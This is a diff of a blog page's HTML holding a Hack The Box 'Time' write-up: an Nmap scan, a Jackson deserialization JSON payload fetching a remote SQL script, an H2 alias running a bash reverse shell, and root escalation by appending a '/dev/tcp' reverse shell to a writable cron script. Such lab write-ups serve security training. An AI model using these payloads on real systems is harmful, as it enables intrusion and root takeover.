@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html>
-  <head>
+<!DOCTYPE html><html><head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   
   
   <title>  HTB Time Writeup |   Ikonw </title>
@@ -24,7 +22,7 @@
   <nav class="inner">
     <div class="title">
       <a href="/">
-        <img class="logo" src="/images/logo.png" />
+        <img class="logo" src="/images/logo.png">
       </a>
     </div>
 
@@ -116,15 +114,13 @@
 
 		
 			
-				<div class="banner" 
-				src="/images/HTB-Time/image-20201107200513767.png" 
-				style="background-image:url(/images/HTB-Time/image-20201107200513767.png)"> </div>	
+				<div class="banner" src="/images/HTB-Time/image-20201107200513767.png" style="background-image:url(/images/HTB-Time/image-20201107200513767.png)"> </div>	
 
 		
 
 			
 					<p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
-<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
 <p>Start to enumerate at the <em>http</em> port</p>
 <p>Not able to find other directory other than the index page</p>
@@ -132,40 +128,40 @@
 <p>Guess this is the only route to <em>user</em></p>
 <p>Tried different input</p>
 <p><img src="/images/HTB-Time/image-20201107201052773.png" alt="image-20201107201052773"></p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">&#x27;test&#x27;</span>: was expecting <span class="string">&#x27;null&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span> or NaN</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">'test'</span>: was expecting <span class="string">'null'</span>, <span class="string">'true'</span>, <span class="string">'false'</span> or NaN</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Found some error message.</p>
 <p>After googling, with the keyword <em>fasterxml and jackson</em></p>
 <p>we found this <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12384">CVE</a></p>
 <p>Create a <em>inject.sql</em> with bash reverse shell</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command <span class="operator">=</span> &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException {</span><br><span class="line">        String[] command <span class="operator">=</span> {"bash", "-c", cmd};</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter("\\A");</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : "";  }</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'</span>)</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Start a python server</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Also start a listner</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Finally our payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>,{<span class="string">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://x.x.x.x/inject.sql'"</span>}]</span><br></pre></td></tr></tbody></table></figure>
 
 <p>​	And we got our reverse shell back</p>
 <p><img src="/images/HTB-Time/image-20201107204418416.png" alt="image-20201107204418416"></p>
 <h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><p>After some enumeration manage to find something interesting using <strong>PSPY64</strong></p>
-<p><img src="/images/HTB-Time/image-20201107194832954.png" alt="image-20201107194832954"></p>
-<p> <strong>&#x2F;usr&#x2F;bin&#x2F;timer_backup.sh</strong> is run by Root</p>
+<p><img src="/images/placeholder.png" alt="image-20201107194832954" data-src="/images/HTB-Time/image-20201107194832954.png" class="lazyload"></p>
+<p> <strong>/usr/bin/timer_backup.sh</strong> is run by Root</p>
 <p><code>-rwxrw-rw- 1 pericles pericles 88 Nov  7 12:50 /usr/bin/timer_backup.sh</code></p>
 <p>We have write permission.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1"</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></tbody></table></figure>
 
 <p>and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></tbody></table></figure>
 
-<br/>
-<br/>
-<br/>
+<br>
+<br>
+<br>
 
-<p><img src="/images/root.gif" alt="root"></p>
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
   	
 					
 	  </div>     
@@ -194,25 +190,31 @@
         <li class="iconfont 
 		icon-share-weixin 
 		-mob-share-weixin 
-		item"
-		></li>		
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-twitter 
 		-mob-share-twitter 
-		item"
-		></li>		
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-google 
 		-mob-share-google 
-		item"
-		></li>		
+		item"></li>		
    	   
 </ul>	
 
-<script id="-mob-share" 
-src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
       
     </div>
   </div>
@@ -255,7 +257,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 
     <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 
-    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+    <script src="//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js"></script>
 
     <script>
         new Valine({
@@ -281,10 +283,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
   
     <div class="none" id="search">
     <div class="header">
-        <input type="text" 
-        placeholder="Typing Something here." 
-        id="search-input" 
-        class="input" />
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
         
         <i id="search-cancel" class="iconfont icon-cancel"></i>
     </div>
@@ -294,7 +293,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
       
 
          
@@ -341,14 +340,14 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 <footer class="footer">
 	<div class="inner">
 		<div class="copyright">
-			&copy;
+			©
 			
-			2019 -
+			2020 -
 			
 			2023
 			Ikonw
 
-			<br/>
+			<br>
 			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
 		</div>
 	</div>
@@ -357,5 +356,5 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
     
 <script src="/nayo.bundle.js"></script>
            
-  </body>        
-</html>
+          
+</body></html>
